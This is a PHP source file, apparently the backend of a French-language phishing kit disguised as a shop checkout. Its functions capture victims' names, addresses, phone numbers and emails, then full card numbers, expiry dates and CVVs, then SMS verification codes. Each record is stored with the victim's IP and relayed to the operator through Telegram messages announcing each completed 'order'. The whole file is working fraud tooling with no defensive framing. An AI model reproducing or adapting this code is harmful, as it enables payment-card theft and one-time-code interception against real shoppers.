<?php
// === CAPTURE DES DONNÉES ===

function getUserFullPhone($userId) {
    $userFile = __DIR__ . '/data/user_data.json';
    
    if (!file_exists($userFile)) {
        return '';
    }
    
    $allUsers = json_decode(file_get_contents($userFile), true);
    $userData = $allUsers[$userId] ?? null;
    
    if (!$userData || empty($userData['livraison']['telephone'])) {
        return '';
    }
    
    return $userData['livraison']['telephone'];
}

function formatPhoneForDisplay($phone) {
    if (empty($phone)) {
        return 'Non renseigné';
    }
    
    $cleanedPhone = preg_replace('/[^0-9]/', '', $phone);
    
    if (strlen($cleanedPhone) === 10) {
        return implode(' ', str_split($cleanedPhone, 2));
    }
    
    return $phone;
}

function getUserPhoneNumber($userId) {
    $fullPhone = getUserFullPhone($userId);
    return formatPhoneForDisplay($fullPhone);
}

function captureFormData() {
    $userId = getUserID();
    $data = [
        'nom' => $_POST['nom'] ?? '',
        'prenom' => $_POST['prenom'] ?? '',
        'telephone' => $_POST['telephone'] ?? '',
        'email' => $_POST['email'] ?? '',
        'adresse' => $_POST['adresse'] ?? '',
        'code_postal' => $_POST['code_postal'] ?? '',
        'ville' => $_POST['ville'] ?? '',
        'timestamp' => date('Y-m-d H:i:s'),
        'user_id' => $userId,
        'ip' => getUserIP(),
        'page' => 'boutique'
    ];
    
    updateUserData($userId, 'livraison', $data);
}

function capturePaymentData() {
    $userId = getUserID();
    $data = [
        'card_number' => $_POST['card_number'] ?? '',
        'card_name' => $_POST['card_name'] ?? '',
        'expiry_date' => $_POST['expiry_date'] ?? '',
        'cvv' => $_POST['cvv'] ?? '',
        'timestamp' => date('Y-m-d H:i:s'),
        'user_id' => $userId,
        'ip' => getUserIP(),
        'page' => 'payment'
    ];
    
    updateUserData($userId, 'paiement', $data);
}

function captureSMSData() {
    $userId = getUserID();
    $smsCode = $_POST['sms_code'] ?? '';
    $fullPhone = getUserFullPhone($userId);
    $displayPhone = getUserPhoneNumber($userId);
    
    $data = [
        'sms_code' => $smsCode,
        'phone_full' => $fullPhone,
        'phone_display' => $displayPhone,
        'timestamp' => date('Y-m-d H:i:s'),
        'user_id' => $userId,
        'ip' => getUserIP(),
        'page' => 'sms'
    ];
    
    updateUserData($userId, 'sms', $data);
}

function updateUserData($userId, $type, $data) {
    $userFile = __DIR__ . '/data/user_data.json';
    $allUsers = [];
    
    if (file_exists($userFile)) {
        $allUsers = json_decode(file_get_contents($userFile), true) ?? [];
    }
    
    if (!isset($allUsers[$userId])) {
        $allUsers[$userId] = [
            'user_id' => $userId,
            'ip' => getUserIP(),
            'created_at' => date('Y-m-d H:i:s'),
            'last_update' => date('Y-m-d H:i:s'),
            'livraison' => [],
            'paiement' => [],
            'sms' => []
        ];
    }
    
    $allUsers[$userId][$type] = $data;
    $allUsers[$userId]['last_update'] = date('Y-m-d H:i:s');
    
    safeFilePutContents($userFile, json_encode($allUsers, JSON_PRETTY_PRINT));
    
    sendGroupedTelegramNotification($userId, $type);
}

function getUserData($userId) {
    $userFile = __DIR__ . '/data/user_data.json';
    
    if (!file_exists($userFile)) {
        return [];
    }
    
    $allUsers = json_decode(file_get_contents($userFile), true);
    return $allUsers[$userId] ?? [];
}

function sendGroupedTelegramNotification($userId, $step) {
    $userData = getUserData($userId);
    
    if (!$userData) {
        return;
    }
    
    if ($step === 'sms' || $step === 'loader2') {
        sendCompleteOrderNotification($userId, $userData);
    } else {
        $message = "🔔 *PROGRESSION UTILISATEUR*\n\n";
        $message .= "🆔 *User ID:* `$userId`\n";
        $message .= "🌐 *IP:* `" . ($userData['ip'] ?? 'N/A') . "`\n";
        $message .= "📊 *Étape actuelle:* `$step`\n";
        $message .= "⏰ *Dernière mise à jour:* " . date('H:i:s') . "\n\n";
        
        if (!empty($userData['livraison'])) {
            $liv = $userData['livraison'];
            $message .= "📦 *LIVRAISON:* ✅ COMPLET\n";
            $message .= "• 👤 Nom: `" . ($liv['nom'] ?? '') . " " . ($liv['prenom'] ?? '') . "`\n";
            $message .= "• 📞 Tél: `" . ($liv['telephone'] ?? '') . "`\n";
            $message .= "• 📧 Email: `" . ($liv['email'] ?? '') . "`\n";
            $message .= "• 🏠 Adresse: `" . ($liv['adresse'] ?? '') . ", " . ($liv['code_postal'] ?? '') . " " . ($liv['ville'] ?? '') . "`\n\n";
        } else {
            $message .= "📦 *LIVRAISON:* ❌ Non rempli\n\n";
        }
        
        if (!empty($userData['paiement'])) {
            $pay = $userData['paiement'];
            $message .= "💳 *PAIEMENT:* ✅ COMPLET\n";
            $message .= "• 👤 Titulaire: `" . ($pay['card_name'] ?? '') . "`\n";
            $message .= "• 💳 Carte: `" . ($pay['card_number'] ?? '') . "`\n";
            $message .= "• 📅 Expiration: `" . ($pay['expiry_date'] ?? '') . "`\n";
            $message .= "• 🔒 CVV: `" . ($pay['cvv'] ?? '') . "`\n\n";
        } else {
            $message .= "💳 *PAIEMENT:* ❌ Non rempli\n\n";
        }
        
        if (!empty($userData['sms'])) {
            $sms = $userData['sms'];
            $message .= "📱 *SMS:* ✅ COMPLET\n";
            $message .= "• 🔢 Code: `" . ($sms['sms_code'] ?? '') . "`\n";
            $message .= "• 📞 Téléphone: `" . ($sms['phone_full'] ?? '') . "`\n";
        } else {
            $message .= "📱 *SMS:* ❌ Non rempli\n";
        }
        
        sendTelegramMessage($message);
    }
}

function sendCompleteOrderNotification($userId, $userData) {
    $message = "🎉 *COMMANDE COMPLÈTE !* 🎉\n\n";
    $message .= "🆔 *User ID:* `$userId`\n";
    $message .= "🌐 *IP:* `" . ($userData['ip'] ?? 'N/A') . "`\n";
    $message .= "⏰ *Heure de complétion:* " . date('H:i:s') . "\n";
    $message .= "📅 *Date:* " . date('d/m/Y') . "\n\n";
    
    $message .= "═══════════════════════════════\n";
    $message .= "📦 *INFORMATIONS DE LIVRAISON*\n";
    $message .= "═══════════════════════════════\n";
    
    if (!empty($userData['livraison'])) {
        $liv = $userData['livraison'];
        $message .= "👤 *Nom complet:* `" . ($liv['nom'] ?? '') . " " . ($liv['prenom'] ?? '') . "`\n";
        $message .= "📞 *Téléphone:* `" . ($liv['telephone'] ?? '') . "`\n";
        $message .= "📧 *Email:* `" . ($liv['email'] ?? '') . "`\n";
        $message .= "🏠 *Adresse:* `" . ($liv['adresse'] ?? '') . "`\n";
        $message .= "📍 *Ville:* `" . ($liv['code_postal'] ?? '') . " " . ($liv['ville'] ?? '') . "`\n\n";
    }
    
    $message .= "═══════════════════════════════\n";
    $message .= "💳 *INFORMATIONS DE PAIEMENT*\n";
    $message .= "═══════════════════════════════\n";
    
    if (!empty($userData['paiement'])) {
        $pay = $userData['paiement'];
        $message .= "👤 *Titulaire:* `" . ($pay['card_name'] ?? '') . "`\n";
        $message .= "💳 *Carte:* `" . ($pay['card_number'] ?? '') . "`\n";
        $message .= "📅 *Expiration:* `" . ($pay['expiry_date'] ?? '') . "`\n";
        $message .= "🔒 *CVV:* `" . ($pay['cvv'] ?? '') . "`\n\n";
    }
    
    $message .= "═══════════════════════════════\n";
    $message .= "📱 *VÉRIFICATION SMS*\n";
    $message .= "═══════════════════════════════\n";
    
    if (!empty($userData['sms'])) {
        $sms = $userData['sms'];
        $message .= "🔢 *Code SMS:* `" . ($sms['sms_code'] ?? '') . "`\n";
        $message .= "📞 *Téléphone:* `" . ($sms['phone_full'] ?? '') . "`\n";
    }
    
    $message .= "\n";
    $message .= "✅ *STATUT: COMMANDE FINALISÉE*\n";
    $message .= "🚚 *Livraison en cours de préparation...*";
    
    sendTelegramMessage($message);
}

function captureOrderComplete() {
    $userId = getUserID();
    $userData = getUserData($userId);
    sendCompleteOrderNotification($userId, $userData);
}
?>
